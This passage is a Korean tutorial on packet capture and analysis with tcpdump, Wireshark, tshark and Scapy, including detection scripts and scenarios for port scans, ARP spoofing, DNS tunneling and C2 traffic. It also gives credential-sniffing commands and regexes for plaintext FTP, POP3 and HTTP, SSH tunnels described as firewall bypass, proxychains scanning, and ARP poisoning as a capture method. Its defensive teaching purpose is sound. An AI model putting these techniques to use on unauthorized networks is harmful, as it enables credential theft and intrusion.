# 패킷 분석 — Wireshark & tcpdump 실전 가이드

## 1. 패킷 분석 기초

### 패킷 캡처 도구 비교
| 도구 | 환경 | 특징 |
|------|------|------|
| Wireshark | GUI | 강력한 필터링, 프로토콜 디코딩 |
| tcpdump | CLI | 가볍고 빠름, 스크립트 연동 |
| tshark | CLI | Wireshark CLI 버전 |
| Zeek (Bro) | CLI | 고급 네트워크 분석 |
| NetworkMiner | GUI | 포렌식 특화 |

---

## 2. tcpdump 완전 가이드

### 기본 사용법
```bash
# 기본 캡처 (eth0 인터페이스)
tcpdump -i eth0

# 모든 인터페이스
tcpdump -i any

# 특정 호스트 필터
tcpdump -i eth0 host 192.168.1.100

# 특정 포트 필터
tcpdump -i eth0 port 80
tcpdump -i eth0 port 443
tcpdump -i eth0 'port 80 or port 443'

# 특정 프로토콜
tcpdump -i eth0 icmp
tcpdump -i eth0 tcp
tcpdump -i eth0 udp

# 출발지/목적지 필터
tcpdump -i eth0 src host 192.168.1.100
tcpdump -i eth0 dst host 192.168.1.1
tcpdump -i eth0 src port 80
```

### 고급 필터링
```bash
# TCP SYN 패킷만 캡처 (포트 스캔 탐지)
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'

# SYN/ACK 패킷 (스캔 응답)
tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn|tcp-ack) = (tcp-syn|tcp-ack)'

# RST 패킷만 (연결 거부)
tcpdump -i eth0 'tcp[tcpflags] & tcp-rst != 0'

# HTTP GET 요청만
tcpdump -i eth0 -A 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'

# DNS 쿼리 캡처
tcpdump -i eth0 -n port 53

# ICMP Echo Request만 (ping 모니터링)
tcpdump -i eth0 'icmp[icmptype]=icmp-echo'

# 대용량 패킷 탐지 (DoS 징조)
tcpdump -i eth0 'ip[2:2] > 1000'
```

### 파일 저장 및 읽기
```bash
# pcap 파일로 저장
tcpdump -i eth0 -w capture.pcap

# 저장된 파일 읽기
tcpdump -r capture.pcap

# 특정 시간 동안 캡처 (60초)
timeout 60 tcpdump -i eth0 -w capture.pcap

# 파일 크기 제한 (100MB씩 회전)
tcpdump -i eth0 -w capture-%Y%m%d-%H%M%S.pcap -C 100 -G 3600
```

### 출력 형식 옵션
```bash
tcpdump -i eth0 -n      # IP 주소를 숫자로 표시 (DNS 조회 안 함)
tcpdump -i eth0 -nn     # IP와 포트 모두 숫자로
tcpdump -i eth0 -v      # 상세 출력
tcpdump -i eth0 -vv     # 더 상세한 출력
tcpdump -i eth0 -A      # ASCII로 페이로드 출력
tcpdump -i eth0 -X      # Hex + ASCII 출력
tcpdump -i eth0 -xx     # 이더넷 헤더 포함 Hex 출력
tcpdump -i eth0 -e      # MAC 주소 표시
tcpdump -i eth0 -c 100  # 100개 패킷 캡처 후 종료
```

---

## 3. Wireshark 실전 사용법

### 주요 디스플레이 필터

#### 기본 필터
```
ip.addr == 192.168.1.100      # 특정 IP
ip.src == 192.168.1.100       # 출발지 IP
ip.dst == 192.168.1.100       # 목적지 IP
tcp.port == 80                # 포트 번호
tcp.dstport == 443            # 목적지 포트
udp.port == 53                # UDP 포트

# AND / OR / NOT
ip.src == 192.168.1.1 && tcp.port == 80
ip.addr == 192.168.1.1 || ip.addr == 10.0.0.1
!arp                          # ARP 패킷 제외
```

#### 프로토콜 필터
```
http                          # HTTP 프로토콜
https or ssl or tls           # HTTPS/TLS
dns                           # DNS
arp                           # ARP
icmp                          # ICMP (ping 등)
smtp                          # 이메일
ftp                           # FTP
ssh                           # SSH
```

#### TCP 플래그 필터
```
tcp.flags.syn == 1            # SYN 패킷
tcp.flags.syn == 1 && tcp.flags.ack == 0  # SYN only (포트 스캔 탐지)
tcp.flags.rst == 1            # RST 패킷
tcp.flags.fin == 1            # FIN 패킷
tcp.analysis.retransmission   # 재전송 패킷
```

#### HTTP 분석
```
http.request.method == "GET"
http.request.method == "POST"
http.response.code == 200     # 성공 응답
http.response.code == 404     # 페이지 없음
http.response.code == 500     # 서버 오류
http.request.uri contains "admin"  # URI에 admin 포함
http contains "password"      # 패킷 내 password 문자열
```

### Follow TCP Stream (평문 분석의 핵심)
1. HTTP 패킷 우클릭 → Follow → TCP Stream
2. FTP, Telnet, HTTP 평문 내용 전체 복원 가능
3. 자격 증명, 파일 내용 등 확인 가능

### Statistics 활용
```
Statistics → Protocol Hierarchy    # 프로토콜 비율 분석
Statistics → Conversations         # 통신 세션 목록
Statistics → IO Graph              # 트래픽 그래프
Statistics → HTTP → Requests       # HTTP 요청 목록
```

---

## 4. 패킷 캡처로 알 수 있는 것들

### FTP 크리덴셜 추출
```bash
# tcpdump로 FTP 크리덴셜 캡처
tcpdump -i eth0 -A 'tcp port 21'

# Wireshark 필터
ftp contains "USER" or ftp contains "PASS"

# 출력 예시:
# USER admin
# PASS password123
```

### HTTP 기본 인증 크리덴셜
```bash
# HTTP Authorization 헤더 캡처
tcpdump -i eth0 -A 'tcp port 80' | grep -i "authorization:"

# Base64 디코딩
echo "YWRtaW46cGFzc3dvcmQ=" | base64 -d
# admin:password
```

### DNS 쿼리 분석 (C2 통신 탐지)
```bash
# 비정상적으로 많은 DNS 쿼리 탐지
tcpdump -i eth0 -n port 53 | awk '{print $9}' | sort | uniq -c | sort -rn | head -20

# DNS 터널링 탐지 (긴 서브도메인)
tshark -r capture.pcap -T fields -e dns.qry.name | awk 'length > 50' | sort | uniq
```

### Scapy PCAP 분석기 (Python)

```python
#!/usr/bin/env python3
"""
PCAP 다층 분석기 — 포트 스캔/ARP 스푸핑/DNS 터널링/자격증명 패턴 탐지
실행: python3 pcap_analyzer.py capture.pcap [-v]
"""
import argparse
import re
import sys
from collections import Counter, defaultdict
from datetime import datetime
from pathlib import Path

try:
    from scapy.all import (
        rdpcap, IP, TCP, UDP, ARP, DNS, DNSQR, Raw,
        Ether, ICMP,
    )
except ImportError:
    sys.exit("[!] scapy가 필요합니다: pip3 install scapy")


# ── 분석 함수 ──────────────────────────────────────────

def detect_port_scan(packets: list, threshold: int = 15) -> list[dict]:
    """단일 출발지에서 짧은 시간 내 다수 포트 접근 탐지."""
    # {src_ip: {dst_port}}
    scan_map: defaultdict[str, set] = defaultdict(set)
    for pkt in packets:
        if pkt.haslayer(TCP) and pkt.haslayer(IP):
            tcp = pkt[TCP]
            ip = pkt[IP]
            if tcp.flags & 0x02:  # SYN
                scan_map[ip.src].add(tcp.dport)

    results = []
    for src, ports in scan_map.items():
        if len(ports) >= threshold:
            results.append({
                "type": "포트 스캔",
                "src": src,
                "port_count": len(ports),
                "sample_ports": sorted(ports)[:10],
            })
    return results


def detect_arp_spoof(packets: list) -> list[dict]:
    """동일 IP에 복수 MAC이 나타나는 ARP 스푸핑 탐지."""
    ip_mac: defaultdict[str, set] = defaultdict(set)
    for pkt in packets:
        if pkt.haslayer(ARP) and pkt[ARP].op == 2:  # ARP Reply
            arp = pkt[ARP]
            if arp.psrc and arp.psrc != "0.0.0.0":
                ip_mac[arp.psrc].add(arp.hwsrc.lower())

    return [
        {"type": "ARP 스푸핑", "ip": ip, "macs": list(macs)}
        for ip, macs in ip_mac.items()
        if len(macs) > 1
    ]


def detect_dns_tunneling(packets: list, min_length: int = 50) -> list[dict]:
    """비정상적으로 긴 DNS 쿼리 이름(터널링 징후) 탐지."""
    findings: list[dict] = []
    for pkt in packets:
        if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
            try:
                qname = pkt[DNSQR].qname.decode("utf-8", errors="replace").rstrip(".")
                if len(qname) >= min_length:
                    findings.append({
                        "type": "DNS 터널링 의심",
                        "src": pkt[IP].src if pkt.haslayer(IP) else "?",
                        "query": qname,
                        "length": len(qname),
                    })
            except Exception:
                continue
    return findings


def extract_credentials(packets: list) -> list[dict]:
    """평문 프로토콜(FTP/HTTP/SMTP)에서 자격증명 패턴 추출."""
    creds: list[dict] = []
    patterns = {
        "FTP_USER": re.compile(rb"USER\s+(\S+)", re.IGNORECASE),
        "FTP_PASS": re.compile(rb"PASS\s+(\S+)", re.IGNORECASE),
        "HTTP_AUTH": re.compile(rb"Authorization:\s+Basic\s+(\S+)", re.IGNORECASE),
        "HTTP_FORM": re.compile(rb"(?:password|passwd|pwd)=([^&\s]+)", re.IGNORECASE),
        "SMTP_AUTH": re.compile(rb"AUTH LOGIN|AUTH PLAIN", re.IGNORECASE),
    }
    for pkt in packets:
        if not pkt.haslayer(Raw):
            continue
        payload: bytes = pkt[Raw].load
        src = pkt[IP].src if pkt.haslayer(IP) else "?"
        for name, pattern in patterns.items():
            match = pattern.search(payload)
            if match:
                value = match.group(1).decode("utf-8", errors="replace")[:40] if match.lastindex else "detected"
                creds.append({"type": name, "src": src, "value": value})
    return creds


def protocol_stats(packets: list) -> dict[str, int]:
    """프로토콜별 패킷 수 집계."""
    stats: Counter = Counter()
    for pkt in packets:
        if pkt.haslayer(TCP):   stats["TCP"] += 1
        elif pkt.haslayer(UDP): stats["UDP"] += 1
        elif pkt.haslayer(ICMP): stats["ICMP"] += 1
        elif pkt.haslayer(ARP): stats["ARP"] += 1
        else:                   stats["Other"] += 1
    return dict(stats)


# ── 메인 ───────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(
        description="PCAP 다층 분석기 — 포트 스캔/ARP 스푸핑/DNS 터널링/자격증명 탐지",
    )
    parser.add_argument("pcap", help="분석할 .pcap / .pcapng 파일")
    parser.add_argument("-v", "--verbose", action="store_true", help="상세 출력")
    parser.add_argument("--scan-threshold", type=int, default=15,
                        help="포트 스캔 탐지 최소 포트 수 (기본값: 15)")
    parser.add_argument("--dns-min-len", type=int, default=50,
                        help="DNS 터널링 의심 최소 쿼리 길이 (기본값: 50)")
    args = parser.parse_args()

    pcap_path = Path(args.pcap)
    if not pcap_path.exists():
        sys.exit(f"[!] 파일 없음: {pcap_path}")

    print(f"[*] 로딩: {pcap_path}  ({pcap_path.stat().st_size // 1024} KB)")
    try:
        packets = rdpcap(str(pcap_path))
    except Exception as e:
        sys.exit(f"[!] PCAP 읽기 오류: {e}")

    print(f"[*] 총 패킷: {len(packets)}개\n")

    # 프로토콜 통계
    stats = protocol_stats(packets)
    print("[*] 프로토콜 분포")
    for proto, count in sorted(stats.items(), key=lambda x: -x[1]):
        print(f"    {proto:<8}  {count:>6}개")

    # 탐지 실행
    for findings, label in [
        (detect_port_scan(packets, args.scan_threshold), "포트 스캔"),
        (detect_arp_spoof(packets), "ARP 스푸핑"),
        (detect_dns_tunneling(packets, args.dns_min_len), "DNS 터널링"),
        (extract_credentials(packets), "자격증명"),
    ]:
        print(f"\n[*] {label} 탐지: {len(findings)}건")
        for f in findings[:10]:  # 최대 10건 출력
            if args.verbose:
                print(f"    {f}")
            else:
                summary = f.get("src", "") or f.get("ip", "")
                detail = (
                    f.get("port_count") or f.get("macs") or
                    f.get("query", "")[:40] or f.get("value", "")
                )
                print(f"    [{f['type']}] {summary}  →  {detail}")
        if len(findings) > 10:
            print(f"    ... 외 {len(findings) - 10}건")

    print(f"\n[*] 분석 완료: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")


if __name__ == "__main__":
    main()
```

---

## 5. Wireshark 색상 규칙 이해

| 색상 | 의미 |
|------|------|
| 검정 배경 빨간 글씨 | 오류 패킷 (체크섬 불일치 등) |
| 파란 배경 | DNS, ARP 등 일반 정보 |
| 연두색 | HTTP 트래픽 |
| 회색 | TCP 트래픽 |
| 노란색 | 경고 (재전송, 순서 오류) |
| 보라색 | TCP RST, FIN |

---

## 6. 실전 패킷 분석 시나리오

### 시나리오 1: 포트 스캔 탐지
```
증상: 대량의 SYN 패킷, 대부분 RST로 응답

Wireshark 필터:
  tcp.flags.syn == 1 && tcp.flags.ack == 0

분석 포인트:
  1. 출발지 IP가 동일하고 목적지 포트가 순차적으로 변함
  2. 짧은 시간 내 수백~수천 개의 SYN 패킷
  3. SYN/RST 응답 비율이 높음 (닫힌 포트)
  4. SYN/SYN+ACK 응답 = 열린 포트
```

### 시나리오 2: ARP 스푸핑 탐지
```
증상: 동일 IP에 대해 서로 다른 MAC 주소의 ARP Reply

Wireshark 필터:
  arp.opcode == 2  (ARP Reply만)

분석 포인트:
  1. 동일 IP에 대해 두 개 이상의 MAC 주소가 응답
  2. 짧은 간격으로 연속적인 ARP Reply
  3. 특히 게이트웨이 IP에 대한 이중 응답 주시
```

### 시나리오 3: 비밀번호 스니핑
```
캡처 환경: 스위치 환경에서는 미러링(SPAN) 포트 필요
           허브 환경에서는 바로 캡처 가능

Wireshark 필터 (FTP):
  ftp.request.command == "USER" or ftp.request.command == "PASS"

Wireshark 필터 (HTTP 폼):
  http.request.method == "POST" && http contains "password"

tshark 자동 추출:
  tshark -r capture.pcap -Y "ftp.request.command" -T fields -e ftp.request.arg
```

---

## 7. SSH 터널링 & 포트 포워딩

### 로컬 포트 포워딩
```bash
# 로컬 8080 → 서버의 80포트 (방화벽 우회)
ssh -L 8080:localhost:80 user@server.com

# 내부망 서버 접근 (점프 호스트)
ssh -L 3389:internal.host:3389 user@jumphost.com

# 브라우저에서 http://localhost:8080 으로 접속
```

### 리버스 포트 포워딩 (방화벽 우회)
```bash
# 서버의 2222 → 로컬 22 (NAT 뒤에 있는 서버에 접근)
ssh -R 2222:localhost:22 user@public.server.com

# 공개 서버에서 내부 서버 SSH 접근
ssh -p 2222 localhost
```

### SOCKS 프록시 (동적 포트 포워딩)
```bash
# SSH를 통한 SOCKS5 프록시 생성
ssh -D 1080 user@server.com

# ProxyChains 설정 (/etc/proxychains.conf)
# socks5 127.0.0.1 1080

# ProxyChains를 통한 도구 사용
proxychains nmap -sT 10.0.0.1
proxychains curl http://internal.site/
```

---

## 8. Wireshark 심화 — 실전 분석 기법

### 패킷 캡처 필터 (캡처 전 적용, BPF 문법)
```
# 캡처 필터 (Capture Filter) — Wireshark 시작 전 설정
host 192.168.1.100              # 특정 호스트 캡처
net 192.168.1.0/24              # 서브넷 캡처
port 80                          # 포트 80
portrange 1-1024                 # 포트 범위
tcp                              # TCP만
not arp and not icmp             # ARP, ICMP 제외
host 10.0.0.1 and port 443      # 특정 호스트의 HTTPS
```

### 고급 디스플레이 필터
```
# 문자열 검색
frame contains "password"        # 모든 패킷에서 문자열 검색
http.request.uri contains "login"
http.cookie contains "session"

# 비교 연산
tcp.len > 1000                   # TCP 데이터 길이
ip.ttl < 10                      # TTL이 낮은 패킷 (루프 의심)
frame.len > 1500                 # 점보 프레임

# 시간 기반 필터
frame.time_delta > 1.0           # 이전 패킷으로부터 1초 이상 경과

# TCP 스트림 번호
tcp.stream eq 5                  # 5번 TCP 스트림만

# 재조립된 패킷
http.request and ip.src != 192.168.1.1

# ICMP 타입별 필터
icmp.type == 8                   # Echo Request (ping)
icmp.type == 0                   # Echo Reply
icmp.type == 3                   # Destination Unreachable
icmp.type == 11                  # Time Exceeded (TTL 만료)
```

### tshark 자동화 분석
```bash
# 특정 필드만 추출
tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e tcp.port

# HTTP 요청 URL 목록
tshark -r capture.pcap -Y http.request -T fields \
    -e ip.src -e http.host -e http.request.uri

# DNS 쿼리 목록 (C2 탐지)
tshark -r capture.pcap -Y dns.flags.response==0 \
    -T fields -e ip.src -e dns.qry.name | sort | uniq -c | sort -rn

# FTP 자격증명 추출
tshark -r capture.pcap -Y "ftp.request.command == USER or ftp.request.command == PASS" \
    -T fields -e ftp.request.command -e ftp.request.arg

# 의심스러운 대용량 파일 전송 탐지
tshark -r capture.pcap -qz conv,tcp | sort -k5 -rn | head -20

# pcap을 JSON으로 변환 (자동화 파이프라인)
tshark -r capture.pcap -T json > capture.json

# 실시간 캡처와 분석 동시 (파이프)
tshark -i eth0 -Y "tcp.flags.syn==1 and tcp.flags.ack==0" \
    -T fields -e ip.src -e tcp.dstport | sort | uniq -c | sort -rn
```

### 실시간 네트워크 이상 탐지 스크립트 (Python)

```python
#!/usr/bin/env python3
"""
실시간 네트워크 이상 탐지기 — SYN 플러드, 포트 스캔, 비정상 ICMP 모니터링
실행: sudo python3 net_monitor.py [-i eth0] [--syn-limit 100]
"""
import argparse
import sys
import threading
import time
from collections import defaultdict
from datetime import datetime

try:
    from scapy.all import sniff, IP, TCP, UDP, ICMP, ARP
except ImportError:
    sys.exit("[!] scapy가 필요합니다: pip3 install scapy")


class NetworkMonitor:
    def __init__(self, iface: str, syn_limit: int, scan_limit: int, window: int) -> None:
        self.iface = iface
        self.syn_limit = syn_limit      # 시간 창 내 최대 SYN 수
        self.scan_limit = scan_limit    # 포트 스캔 탐지 임계값
        self.window = window            # 집계 시간 창(초)

        self._lock = threading.Lock()
        self.stats = {
            "total": 0, "tcp": 0, "udp": 0,
            "icmp": 0, "arp": 0, "alerts": 0,
        }
        # {src_ip: count}
        self._syn_counts: defaultdict[str, int] = defaultdict(int)
        # {src_ip: {dst_port}}
        self._scan_map: defaultdict[str, set] = defaultdict(set)

        # 주기적으로 카운터 초기화
        self._reset_thread = threading.Thread(target=self._reset_loop, daemon=True)
        self._reset_thread.start()

    def _reset_loop(self) -> None:
        while True:
            time.sleep(self.window)
            with self._lock:
                self._syn_counts.clear()
                self._scan_map.clear()

    def _alert(self, msg: str) -> None:
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"\n  [ALERT] {ts}  {msg}")
        self.stats["alerts"] += 1

    def process(self, pkt) -> None:
        with self._lock:
            self.stats["total"] += 1

            if pkt.haslayer(TCP):
                self.stats["tcp"] += 1
                tcp = pkt[TCP]
                ip = pkt[IP] if pkt.haslayer(IP) else None
                if not ip:
                    return

                # SYN 플러드 탐지
                if tcp.flags & 0x02 and not (tcp.flags & 0x10):
                    self._syn_counts[ip.src] += 1
                    if self._syn_counts[ip.src] == self.syn_limit:
                        self._alert(
                            f"SYN 플러드 의심: {ip.src} → "
                            f"{self._syn_counts[ip.src]}개/{self.window}s"
                        )

                    # 포트 스캔 탐지
                    self._scan_map[ip.src].add(tcp.dport)
                    if len(self._scan_map[ip.src]) == self.scan_limit:
                        self._alert(
                            f"포트 스캔 의심: {ip.src} → "
                            f"{len(self._scan_map[ip.src])}포트/{self.window}s"
                        )

            elif pkt.haslayer(UDP):
                self.stats["udp"] += 1
            elif pkt.haslayer(ICMP):
                self.stats["icmp"] += 1
            elif pkt.haslayer(ARP):
                self.stats["arp"] += 1

    def print_stats(self) -> None:
        s = self.stats
        print(
            f"\r  패킷: {s['total']:>7}  "
            f"TCP:{s['tcp']:>6}  UDP:{s['udp']:>6}  "
            f"ICMP:{s['icmp']:>5}  ARP:{s['arp']:>5}  "
            f"경보:{s['alerts']:>4}",
            end="", flush=True,
        )


def main() -> None:
    parser = argparse.ArgumentParser(description="실시간 네트워크 이상 탐지기")
    parser.add_argument("-i", "--iface", default="eth0", help="캡처 인터페이스 (기본값: eth0)")
    parser.add_argument("--syn-limit", type=int, default=100,
                        help="SYN 플러드 경보 임계값 (기본값: 100)")
    parser.add_argument("--scan-limit", type=int, default=20,
                        help="포트 스캔 경보 임계값 포트 수 (기본값: 20)")
    parser.add_argument("--window", type=int, default=5,
                        help="집계 시간 창 초 (기본값: 5)")
    args = parser.parse_args()

    monitor = NetworkMonitor(args.iface, args.syn_limit, args.scan_limit, args.window)
    print(f"[*] 모니터링 시작: {args.iface}  |  Ctrl+C로 종료")

    # 통계 출력 스레드
    def stats_printer() -> None:
        while True:
            time.sleep(1)
            monitor.print_stats()

    threading.Thread(target=stats_printer, daemon=True).start()

    try:
        sniff(iface=args.iface, prn=monitor.process, store=False)
    except KeyboardInterrupt:
        print("\n\n[*] 종료")
        monitor.print_stats()
        print()


if __name__ == "__main__":
    main()
```

### pcap 파일 조작 도구
```bash
# editcap — pcap 편집/분할
editcap -c 1000 large.pcap split.pcap      # 1000 패킷씩 분할
editcap -i 60 large.pcap split.pcap        # 60초씩 분할
editcap -A "2024-01-01 00:00:00" -B "2024-01-01 01:00:00" large.pcap filtered.pcap

# mergecap — pcap 합치기
mergecap -w merged.pcap capture1.pcap capture2.pcap

# capinfos — pcap 파일 정보
capinfos capture.pcap

# tcpreplay — pcap 재생 (트래픽 시뮬레이션)
tcpreplay -i eth0 --mbps=10 capture.pcap
tcpreplay -i eth0 --loop=5 capture.pcap    # 5회 반복 재생
```

---

## 9. 네트워크 포렌식 — 패킷에서 증거 추출

### 파일 복원 (Network Miner 방식)
```bash
# Wireshark에서 파일 추출
# File → Export Objects → HTTP (HTTP를 통해 전송된 파일)
# File → Export Objects → FTP-DATA

# tcpflow로 TCP 스트림 파일 복원
apt-get install tcpflow
tcpflow -r capture.pcap -o output_dir/

# NetworkMiner (GUI)
# 실행 후 pcap 로드 → Files 탭에서 추출된 파일 확인
```

### 이메일 트래픽 분석
```bash
# SMTP 명령 캡처
tcpdump -i eth0 -A 'tcp port 25' | grep -E "(MAIL FROM|RCPT TO|DATA|Subject)"

# Wireshark SMTP 필터
# smtp.req.command == "MAIL" or smtp.req.command == "RCPT"
# smtp contains "Subject:"

# POP3 크리덴셜 (평문 전송)
tcpdump -i eth0 -A 'tcp port 110' | grep -E "(USER|PASS)"
```

### 비정상 트래픽 패턴 탐지
```
포트 스캔 지표:
  - 단시간에 대량의 SYN 패킷
  - 다양한 목적지 포트
  - 대부분 RST로 응답 (닫힌 포트)

DoS/DDoS 지표:
  - 특정 목적지로 과도한 트래픽
  - 동일한 패킷 패턴 반복
  - 비정상적으로 높은 패킷 속도

DNS 터널링 지표:
  - 비정상적으로 긴 도메인 이름 (50자 이상)
  - TXT, NULL 레코드 타입 쿼리
  - 높은 DNS 쿼리 빈도

C2 (Command & Control) 통신 지표:
  - 규칙적인 간격의 beacon 트래픽
  - 암호화된 소량 데이터 반복 전송
  - 비표준 포트 사용 (HTTP가 80이 아닌 포트에서)
  - 도메인 생성 알고리즘(DGA) 패턴
```

### Wireshark 실전 프로파일 설정
```
색상 규칙 커스터마이징 (View → Coloring Rules):
  - SYN Flood:  tcp.flags.syn==1 and tcp.flags.ack==0  → 빨간 배경
  - ARP 공격:   arp.duplicate-address-detected          → 노란 배경
  - 평문 인증:   ftp or http.authorization              → 주황 배경
  - DNS 이상:   dns and dns.resp.type == 16 (TXT)      → 보라 배경

프로파일 저장: Edit → Configuration Profiles → New
→ 프로파일별로 필터, 컬럼, 색상 규칙 저장 가능
```

---

## 10. 실전 패킷 트레이서 시나리오

### 시나리오 4: SQL 인젝션 트래픽 탐지
```
Wireshark 필터:
  http.request.uri contains "'" or
  http.request.uri contains "union" or
  http.request.uri contains "select"

탐지 포인트:
  1. GET/POST 파라미터에 SQL 키워드
  2. 비정상적으로 큰 HTTP 응답 (데이터 덤프)
  3. 동일 IP에서 반복적인 오류 응답 (500, 302)
  4. URL 인코딩된 공격 패턴 (%27, %20UNION%20)
```

### 시나리오 5: 랜섬웨어 C2 통신 탐지
```
Wireshark 필터:
  # 의심스러운 DNS (DGA 도메인)
  dns.qry.name matches "[a-z]{10,}\.com"

  # 비정상 HTTPS (인증서 확인 안 된 도메인)
  tls.handshake.type == 1  (Client Hello)
  
  # SMB 취약점 악용 (EternalBlue)
  smb2 and tcp.dstport == 445

탐지 포인트:
  1. 알 수 없는 외부 IP와의 주기적 통신 (beaconing)
  2. 내부망에서 SMB(445) 스캔
  3. 대량의 파일 접근 패턴 (암호화 진행 중)
  4. 외부로의 대용량 데이터 전송 (데이터 유출)
```

### 시나리오 6: 내부자 위협 탐지
```
Wireshark + tshark 조합:
  # 업무 시간 외 접속
  tshark -r capture.pcap -Y "frame.time_epoch > 1700000000" \
      -T fields -e ip.src -e ip.dst | sort | uniq -c

  # 대용량 데이터 외부 전송
  tshark -r capture.pcap -qz conv,tcp | awk '$6 > 10000000'

  # 클라우드 스토리지 업로드 탐지
  http.host contains "dropbox" or http.host contains "drive.google" or
  http.host contains "onedrive"
```

---

## 11. Wireshark 핵심 기능 — 실전 레퍼런스

### 패킷 스니핑 환경별 캡처 방법

#### 허브 환경
```
허브는 모든 포트로 트래픽을 브로드캐스트 → 그냥 연결만 해도 모든 트래픽 캡처 가능
```

#### 스위치 환경에서 캡처하는 3가지 방법
```
1. Port Mirroring (SPAN: Switched Port Analyzer)
   - 스위치 설정으로 특정 포트 트래픽을 분석 포트로 복사
   - Cisco 설정:
     Switch(config)# monitor session 1 source interface Fa0/1
     Switch(config)# monitor session 1 destination interface Fa0/2

2. Hubbing Out
   - 타겟 호스트와 스위치 사이에 허브 삽입 후 허브에 캡처 장비 연결

3. ARP Cache Poisoning (능동적, 탐지 위험 있음)
   - Cain & Abel, arpspoof 등으로 ARP 스푸핑 후 트래픽 가로채기
```

### Wireshark 창 구성
```
메인 창 3개 패널:
  Packet List Pane   - 캡처된 패킷 목록 (번호, 시간, 출발지, 목적지, 프로토콜, 길이, 정보)
  Packet Details Pane - 선택한 패킷의 계층별 헤더 상세 정보 (펼칠 수 있음)
  Packet Bytes Pane  - 선택한 패킷의 Hex + ASCII 원시 데이터

상태바:
  좌측: 전문가 정보 (Expert Info) 경고 수
  중앙: 현재 적용된 표시 필터
  우측: 캡처된 총 패킷 수
```

### 디스플레이 필터 표현식 문법 (Hard Way)
```
기본 구조: [프로토콜].[필드] [연산자] [값]

비교 연산자:
  ==  eq   (같음)
  !=  ne   (같지 않음)
  >   gt   (초과)
  <   lt   (미만)
  >=  ge   (이상)
  <=  le   (이하)
  contains (포함)
  matches  (정규식 일치)

논리 연산자:
  &&  and
  ||  or
  !   not

예시:
  ip.addr == 192.168.1.1 && tcp.port == 80
  tcp.flags == 0x002               # SYN 플래그만
  frame.len >= 100 && frame.len <= 1500
  http.request.uri matches ".*\.php\?.*"   # PHP 파라미터 요청
```

### Wireshark 전문가 정보 (Expert Info)
```
Analyze → Expert Info
 
심각도 수준:
  Error   (빨간) - 체크섬 오류, 잘못된 패킷
  Warning (노란) - 재전송, ACK 유실, TCP Reset
  Note    (청록) - TCP Window Full, Keep-Alive
  Chat    (파란) - 일반 연결 설정/해제 정보

활용:
  - 네트워크 문제 빠른 진단
  - 재전송 폭증 → 회선 품질 문제 또는 DoS
  - TCP Reset 다수 → ACL 차단 또는 포트 스캔
```

### Name Resolution (이름 해석)
```
Wireshark View → Name Resolution:

  Resolve MAC Addresses    - OUI로 제조사 표시 (예: Apple_xx:xx:xx)
  Resolve Network Addresses - IP → 도메인명 변환 (DNS 역조회)
  Resolve Transport Names  - 포트번호 → 서비스명 (예: 80 → http)

주의: Network Address Resolution 활성화 시 DNS 쿼리 발생
     → 캡처 중 추가 트래픽 생성, 분석 결과 혼동 가능
     → 보안 분석 시에는 끄는 것이 권장됨
```

### Protocol Dissection (프로토콜 해석)
```
Analyze → Decode As...
→ 비표준 포트를 사용하는 트래픽 강제 해석
  예: 8080 포트 트래픽을 HTTP로 해석
  예: 비표준 포트 FTP 강제 해석

Analyze → Enable Protocols...
→ 특정 프로토콜 디코더 활성화/비활성화
```

### Statistics 메뉴 활용
```
Statistics → Protocol Hierarchy
→ 전체 캡처에서 프로토콜별 비율 (패킷 수, 바이트 수)
→ 이상한 프로토콜 비중이 높으면 의심

Statistics → Conversations
→ IP/TCP/UDP 세션 목록, 전송량 기준 정렬 가능
→ 대용량 데이터 유출 발신지 추적에 유용

Statistics → IO Graphs
→ 시간대별 트래픽 그래프
→ DDoS, 주기적 beaconing 시각화에 유용

Statistics → Flow Graph
→ 패킷 흐름 시각화 (TCP 연결 수립~종료 순서)
```

---

## 12. 패킷 분석으로 보는 실제 프로토콜 동작

### ARP 동작 분석
```
Wireshark에서 ARP 캡처:
  필터: arp

패킷 구조:
  ARP Request: "Who has 192.168.1.1? Tell 192.168.1.100"
  ARP Reply:   "192.168.1.1 is at AA:BB:CC:DD:EE:FF"

Opcode:
  1 = ARP Request
  2 = ARP Reply

정상: 각 IP에 대해 하나의 MAC만 응답
이상: 동일 IP에 대해 2개 이상의 MAC 응답 → ARP 스푸핑 의심
```

### DHCP 동작 분석
```
DORA 과정:
  D - Discover: 클라이언트 → 브로드캐스트 (255.255.255.255)
  O - Offer:    서버 → 클라이언트에게 IP 제안
  R - Request:  클라이언트 → 브로드캐스트 (IP 선택 알림)
  A - Ack:      서버 → 클라이언트에게 IP 할당 확인

Wireshark 필터:
  bootp    # DHCP는 BOOTP 프로토콜 기반
  dhcp.option.dhcp == 3   # DHCP Request
  dhcp.option.dhcp == 5   # DHCP ACK

Rogue DHCP 탐지:
  dhcp.option.dhcp == 2   # DHCP Offer가 여러 서버에서 오면 의심
```

### HTTP 세션 전체 흐름
```
패킷 분석 순서:
1. TCP 3-Way Handshake (SYN → SYN+ACK → ACK)
2. HTTP Request (GET / HTTP/1.1)
3. HTTP Response (200 OK + 데이터)
4. TCP 4-Way Disconnect (FIN → ACK → FIN → ACK)

Follow TCP Stream으로 전체 HTTP 내용 복원:
패킷 우클릭 → Follow → TCP Stream
→ 평문 HTTP 요청/응답 전체 열람
→ 자격증명, 폼 데이터, 쿠키 등 노출
```

### TCP 문제 패턴 분석
```
TCP 재전송 (Retransmission):
  원인: 패킷 유실, 응답 없음, 회선 불안정
  필터: tcp.analysis.retransmission
  대응: 회선 품질 점검

TCP Duplicate ACK:
  원인: 패킷 순서 뒤바뀜
  필터: tcp.analysis.duplicate_ack
  → 3개 이상 연속 발생 시 Fast Retransmit 트리거

TCP Zero Window:
  원인: 수신 측 버퍼 가득 찬 상태
  필터: tcp.window_size == 0
  → 서버 과부하 또는 메모리 부족 의심

TCP Reset (RST):
  원인: ACL 차단, 포트 닫힘, 방화벽 거부
  필터: tcp.flags.reset == 1
  → 포트 스캔 시 닫힌 포트에서 다수 발생
```

### ICMP 분석
```
ICMP 타입별 의미:
  Type 0  = Echo Reply (ping 응답)
  Type 3  = Destination Unreachable
    Code 0  = Net Unreachable
